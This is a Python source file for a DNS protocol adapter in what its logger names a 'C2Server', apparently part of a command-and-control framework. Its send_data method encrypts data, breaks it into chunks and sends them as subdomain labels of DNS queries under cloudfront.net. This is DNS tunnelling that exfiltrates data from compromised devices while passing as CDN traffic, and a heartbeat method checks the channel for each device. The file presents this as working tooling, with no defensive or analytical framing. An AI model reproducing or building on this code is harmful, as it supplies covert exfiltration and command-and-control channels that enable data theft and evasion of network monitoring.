import dns.resolver
import logging
from typing import Dict, Optional
from datetime import datetime
from protocol_adapter import ProtocolAdapter

class DNSAdapter(ProtocolAdapter):
    def __init__(self, db, key, config):
        super().__init__(db, key, config)
        self.logger = logging.getLogger('C2Server')
        self.servers = config['servers']
        self.domain_prefixes = config['domain_prefixes']
        self.chunk_size = config['chunk_size']
        self.heartbeat_interval = config['heartbeat']['interval_seconds']
        self.timeout = config['heartbeat']['timeout_seconds']

    def send_data(self, data: Dict, device_id: str) -> bool:
        try:
            # Encrypt data
            encrypted_data = self.encrypt_data(data)
            
            # Split data into chunks
            chunks = [encrypted_data[i:i+self.chunk_size] for i in range(0, len(encrypted_data), self.chunk_size)]
            
            for chunk in chunks:
                # Create DNS query
                query = f"{chunk}.cloudfront.net"
                
                # Send DNS query
                resolver = dns.resolver.Resolver()
                resolver.nameservers = self.servers
                resolver.timeout = self.timeout
                resolver.lifetime = self.timeout
                
                try:
                    resolver.query(query, 'A')
                    self.logger.info(f"Successfully sent DNS chunk for device {device_id}")
                except dns.resolver.NoAnswer:
                    self.logger.warning(f"No DNS response for {query}")
                except Exception as e:
                    self.logger.error(f"DNS query failed: {str(e)}")
                    return False
            
            return True
        except Exception as e:
            self.logger.error(f"Error sending DNS data: {str(e)}")
            return False

    def receive_data(self, device_id: str) -> Optional[Dict]:
        # DNS protocol doesn't have a dedicated receive method
        # Data is received through DNS responses
        return None

    def heartbeat(self, device_id: str) -> bool:
        try:
            test_domain = f"test.{self.domain_prefixes[0]}.com"
            resolver = dns.resolver.Resolver()
            resolver.nameservers = self.servers
            resolver.timeout = self.timeout
            resolver.lifetime = self.timeout
            
            try:
                resolver.query(test_domain, 'A')
                self.logger.info(f"DNS heartbeat successful for device {device_id}")
                return True
            except dns.resolver.NoAnswer:
                self.logger.warning(f"No DNS response for heartbeat")
                return False
            except Exception as e:
                self.logger.error(f"DNS heartbeat failed: {str(e)}")
                return False
        except Exception as e:
            self.logger.error(f"Heartbeat failed: {str(e)}")
            return False
